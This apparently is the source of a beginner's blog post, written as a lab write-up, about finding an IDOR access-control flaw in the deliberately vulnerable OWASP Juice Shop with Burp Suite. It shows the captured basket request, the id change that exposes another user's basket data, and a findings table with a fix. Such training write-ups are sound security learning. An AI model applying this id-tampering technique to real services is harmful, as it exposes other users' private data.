@@ -1,0 +1,279 @@
+<!DOCTYPE html>
+<html lang="en-us">
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    
+    <title>QA first steps into webpentest (OWASP Top 10 - A01 Access Control) | TestPilot Project</title>
+    <meta name="viewport" content="width=device-width,minimum-scale=1">
+    <meta name="description" content="After almost 11 years working a QA Engineer, testing web and mobile apps I decided to explore cybersecurity. Welcome to my first write up here a document how I found my first Access Control vulnerability using OWASP Juice Shop and Burp Suite.
+Juicebox Setup
+First thing I did was looking into web pentest (it seems to be the most accessible at least with my knowledge of Web and API testing) and got to know about the OWASP Top 10 a community-driven list of the most critical web application security risks, intended to raise awareness among developers and security professionals.">
+    <meta name="generator" content="Hugo 0.157.0">
+    
+    
+    
+      <meta name="robots" content="noindex, nofollow">
+    
+    
+
+    
+<link rel="stylesheet" href="/ananke/css/main.min.css" >
+
+
+
+
+    
+
+
+    
+      
+
+    
+
+    
+
+    
+      <link rel="canonical" href="http://localhost:1313/posts/first-writeup-idor/">
+    
+
+    
+    
+    <meta property="og:url" content="http://localhost:1313/posts/first-writeup-idor/">
+  <meta property="og:site_name" content="TestPilot Project">
+  <meta property="og:title" content="QA first steps into webpentest (OWASP Top 10 - A01 Access Control)">
+  <meta property="og:description" content="After almost 11 years working a QA Engineer, testing web and mobile apps I decided to explore cybersecurity. Welcome to my first write up here a document how I found my first Access Control vulnerability using OWASP Juice Shop and Burp Suite.
+Juicebox Setup First thing I did was looking into web pentest (it seems to be the most accessible at least with my knowledge of Web and API testing) and got to know about the OWASP Top 10 a community-driven list of the most critical web application security risks, intended to raise awareness among developers and security professionals.">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2026-03-08T20:18:51-04:00">
+    <meta property="article:modified_time" content="2026-03-08T20:18:51-04:00">
+
+  <meta itemprop="name" content="QA first steps into webpentest (OWASP Top 10 - A01 Access Control)">
+  <meta itemprop="description" content="After almost 11 years working a QA Engineer, testing web and mobile apps I decided to explore cybersecurity. Welcome to my first write up here a document how I found my first Access Control vulnerability using OWASP Juice Shop and Burp Suite.
+Juicebox Setup First thing I did was looking into web pentest (it seems to be the most accessible at least with my knowledge of Web and API testing) and got to know about the OWASP Top 10 a community-driven list of the most critical web application security risks, intended to raise awareness among developers and security professionals.">
+  <meta itemprop="datePublished" content="2026-03-08T20:18:51-04:00">
+  <meta itemprop="dateModified" content="2026-03-08T20:18:51-04:00">
+  <meta itemprop="wordCount" content="853">
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="QA first steps into webpentest (OWASP Top 10 - A01 Access Control)">
+  <meta name="twitter:description" content="After almost 11 years working a QA Engineer, testing web and mobile apps I decided to explore cybersecurity. Welcome to my first write up here a document how I found my first Access Control vulnerability using OWASP Juice Shop and Burp Suite.
+Juicebox Setup First thing I did was looking into web pentest (it seems to be the most accessible at least with my knowledge of Web and API testing) and got to know about the OWASP Top 10 a community-driven list of the most critical web application security risks, intended to raise awareness among developers and security professionals.">
+
+	
+  </head><body class="ma0 avenir bg-near-white development is-page is-page page-first-writeup-idor">
+    
+   
+  
+
+  <header>
+    <div class="bg-black">
+      <nav class="pv3 ph3 ph4-ns" role="navigation">
+  <div class="flex-l center items-center justify-between">
+    <a href="/" class="f3 fw2 hover-white white-90 dib no-underline">
+      
+        TestPilot Project
+      
+    </a>
+    <div class="flex-l items-center">
+      
+
+      
+      <div class="ananke-socials"></div>
+
+    </div>
+  </div>
+</nav>
+
+    </div>
+  </header>
+
+
+
+    <main class="pb7" role="main">
+      
+  
+
+  <article class="page-first-writeup-idor flex-l mw7 center ph3 flex-wrap justify-between">
+    <header class="mt4 w-100">
+      <aside class="instapaper_ignoref b helvetica tracked ttu">
+          
+        Posts
+      </aside><div id="sharing" class="mt3 ananke-socials"></div>
+<h1 class="f1 athelas mt3 mb1">QA first steps into webpentest (OWASP Top 10 - A01 Access Control)</h1>
+      
+      
+      
+      <time class="f6 mv4 dib tracked" datetime="2026-03-08T20:18:51-04:00">March 8, 2026</time>
+      
+
+      
+      
+    </header>
+    <div class="nested-copy-line-height lh-copy serif f4 nested-links mid-gray pr4-l w-100-l"><p>After almost 11 years working a QA Engineer, testing web and mobile apps I decided to explore cybersecurity. Welcome to my first write up here a document how I found my first Access Control vulnerability using OWASP Juice Shop and Burp Suite.</p>
+<h2 id="juicebox-setup">Juicebox Setup</h2>
+<p>First thing I did was looking into web pentest (it seems to be the most accessible at least with my knowledge of Web and API testing) and got to know about the OWASP Top 10 a community-driven list of the most critical web application security risks, intended to raise awareness among developers and security professionals.</p>
+<p>From there I got curious and wanted to play with these vulnerabilities just that &hellip;well, I didn&rsquo;t have a website to do so, and I really shouldn&rsquo;t just try attacks on a random website. So I learn about VMs and how I could install Kali Linux which comes with a ton of cybersecurity tools free at my disposal. I downloaded Oracle&rsquo;s Virtual Box, then the Kali Linux ISO and proceeded to install the OS. Once I was up and running I discover that OWASP had this &ldquo;training website&rdquo; called <em>Juicebox</em> which had a bunch of challenges for web pentesting that I could not only access through the web but also run it locally via Docker container with just one command.</p>
+<pre tabindex="0"><code>Pull OWASP JuiceBox Shop 
+docker pull bkimminich/juice-shop
+</code></pre><pre tabindex="0"><code>Run OWASP JuiceBox Shop Container
+docker run -p 3000:3000 bkimminich/juice-shop
+</code></pre><h3 id="burpsuite">Burpsuite</h3>
+<p>With Juicebox up and running I decided to see what the website was about. Thinking as a QA I started to do some exploratory testing, how the website works, what might look out of place, what were my limitations as a user, etc. But this wasn&rsquo;t a website for me break as a regular user, this is a website for me to act and think as a hacker. This is when I learn about burpsuite, and Kali linux already had it ready for me to use, but my browser wasn&rsquo;t setup for that. I then set the Firefox proxy so when I toggle it Brupsuite could intersect the requests and responses from the website. I found it overwhelming at first (like any other new thing we learn) but thankfully since I dealt with API testing before I was able to find some familiarity with request statuses and tempering with them.</p>
+<h3 id="first-vulnerability">First vulnerability</h3>
+<p>The first week I focused on the Access control vulnerabilities, being in the number 1 spot of the OWASP Top 10 I figure I could, relatively easy, be able to get access to user data I wasn&rsquo;t suppose to.</p>
+<p>I dig for a couple of days (In between day job and daily life) until I notice I could temper with the userId of one of the endpoints I capture from the &ldquo;basket&rdquo; (that would be like the Amazon cart here).</p>
+<pre tabindex="0"><code>GET /rest/basket/6 HTTP/1.1
+Host: localhost:3000
+User-Agent: N/A
+Accept: application/json, text/plain, */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+</code></pre><p>I first capture it and send it to the &ldquo;repeater&rdquo; (a designated tab in the Burpsuite tool to iterate in a single request). Then I simple changes the userId from the endpoint from &lsquo;6&rsquo; to &lsquo;1&rsquo; and for the first time in 2 days I actually got a 200 OK status, not only that I got a response with data from another user.</p>
+<pre tabindex="0"><code>{
+   &#34;status&#34;:&#34;success&#34;,
+   &#34;data&#34;:{
+      &#34;id&#34;:1,
+      &#34;coupon&#34;:null,
+      &#34;UserId&#34;:1,
+      &#34;createdAt&#34;:&#34;2026-02-24T01:56:12.744Z&#34;,
+      &#34;updatedAt&#34;:&#34;2026-02-24T01:56:12.744Z&#34;,
+      &#34;Products&#34;:[
+         {
+            &#34;id&#34;:1,
+            &#34;name&#34;:&#34;Apple Juice (1000ml)&#34;,
+            &#34;description&#34;:&#34;The all-time classic.&#34;,
+            &#34;price&#34;:1.99,
+            &#34;deluxePrice&#34;:0.99,
+            &#34;image&#34;:&#34;apple_juice.jpg&#34;,
+            &#34;createdAt&#34;:&#34;2026-02-24T01:56:12.343Z&#34;,
+            &#34;updatedAt&#34;:&#34;2026-02-24T01:56:12.343Z&#34;,
+            &#34;deletedAt&#34;:null,
+            &#34;BasketItem&#34;:{
+               &#34;ProductId&#34;:1,
+               &#34;BasketId&#34;:1,
+               &#34;id&#34;:1,
+               &#34;quantity&#34;:2,
+               &#34;createdAt&#34;:&#34;2026-02-24T01:56:12.869Z&#34;,
+               &#34;updatedAt&#34;:&#34;2026-02-24T01:56:12.869Z&#34;
+            }
+         },
+         {
+            &#34;id&#34;:2,
+            &#34;name&#34;:&#34;Orange Juice (1000ml)&#34;,
+            &#34;description&#34;:&#34;Made from oranges hand-picked by Uncle Dittmeyer.&#34;,
+            &#34;price&#34;:2.99,
+            &#34;deluxePrice&#34;:2.49,
+            &#34;image&#34;:&#34;orange_juice.jpg&#34;,
+            &#34;createdAt&#34;:&#34;2026-02-24T01:56:12.343Z&#34;,
+            &#34;updatedAt&#34;:&#34;2026-02-24T01:56:12.343Z&#34;,
+            &#34;deletedAt&#34;:null,
+            &#34;BasketItem&#34;:{
+               &#34;ProductId&#34;:2,
+               &#34;BasketId&#34;:1,
+               &#34;id&#34;:2,
+               &#34;quantity&#34;:3,
+               &#34;createdAt&#34;:&#34;2026-02-24T01:56:12.869Z&#34;,
+               &#34;updatedAt&#34;:&#34;2026-02-24T01:56:12.869Z&#34;
+            }
+         },
+         {
+            &#34;id&#34;:3,
+            &#34;name&#34;:&#34;Eggfruit Juice (500ml)&#34;,
+            &#34;description&#34;:&#34;Now with even more exotic flavour.&#34;,
+            &#34;price&#34;:8.99,
+            &#34;deluxePrice&#34;:8.99,
+            &#34;image&#34;:&#34;eggfruit_juice.jpg&#34;,
+            &#34;createdAt&#34;:&#34;2026-02-24T01:56:12.343Z&#34;,
+            &#34;updatedAt&#34;:&#34;2026-02-24T01:56:12.343Z&#34;,
+            &#34;deletedAt&#34;:null,
+            &#34;BasketItem&#34;:{
+               &#34;ProductId&#34;:3,
+               &#34;BasketId&#34;:1,
+               &#34;id&#34;:3,
+               &#34;quantity&#34;:1,
+               &#34;createdAt&#34;:&#34;2026-02-24T01:56:12.869Z&#34;,
+               &#34;updatedAt&#34;:&#34;2026-02-24T01:56:12.869Z&#34;
+            }
+         }
+      ]
+   }
+}
+</code></pre><p>I could see the baskets of other users with only the change of a single digit.</p>
+<h3 id="idor">IDOR</h3>
+<p>Once I capture my first vulnerability I write down how I did it and what were my findings. Just that I wanted to do it properly, how a pentester would do it. So I did a table like the one below:</p>
+<table>
+  <thead>
+      <tr>
+          <th>Field</th>
+          <th>Entry</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>OWASP Top 10</td>
+          <td>A01 - Broken access control</td>
+      </tr>
+      <tr>
+          <td>Target</td>
+          <td>OWASP Juice shop</td>
+      </tr>
+      <tr>
+          <td>Endpoint</td>
+          <td>/rest/basket/1</td>
+      </tr>
+      <tr>
+          <td>Original Request</td>
+          <td>/rest/basket/6</td>
+      </tr>
+      <tr>
+          <td>Payload</td>
+          <td>Change ‘6’ to ‘1’</td>
+      </tr>
+      <tr>
+          <td>Result</td>
+          <td>Got access to another user’s basket of items</td>
+      </tr>
+      <tr>
+          <td>Root Cause</td>
+          <td>No Authorization Check</td>
+      </tr>
+      <tr>
+          <td>Impact</td>
+          <td>Unauthorized access to private user data</td>
+      </tr>
+      <tr>
+          <td>Fix</td>
+          <td>Validate user ownership / Enforce RBAC (Role base access control)</td>
+      </tr>
+      <tr>
+          <td>Tool used</td>
+          <td>Burp suite, Docker</td>
+      </tr>
+  </tbody>
+</table>
+<p>I also learned that the vulnerability that I found actually had a name inside the Broken Access control category and that is IDOR (Insecure Direct Object Reference) which is defined as a vulnerability that displays content to unauthorized users through URLs and/or form tempering, which fits the description of what I did.</p>
+<p>Once I found it I started tempering with the ids to see how many user&rsquo;s basket I could see. I reach the limit of 6 total.</p>
+<p>Not only that but I also created a simple CLI tool to automate the attack. Here the github:
+<a href="https://github.com/mmarinez/juicebox-idor">https://github.com/mmarinez/juicebox-idor</a></p>
+<ul class="pa0">
+  
+</ul>
+
+      
+    </div></article>
+
+    </main>
+    <footer class="bg-black bottom-0 w-100 pa3" role="contentinfo">
+  <div class="flex justify-between">
+  <a class="f4 fw4 hover-white white-70 dn dib-ns pv2 ph3 no-underline" href="http://localhost:1313/" >
+    &copy;  TestPilot Project 2026 
+  </a>
+    <div><div class="ananke-socials"></div>
+</div>
+  </div>
+</footer>
+
+  </body>
+</html>
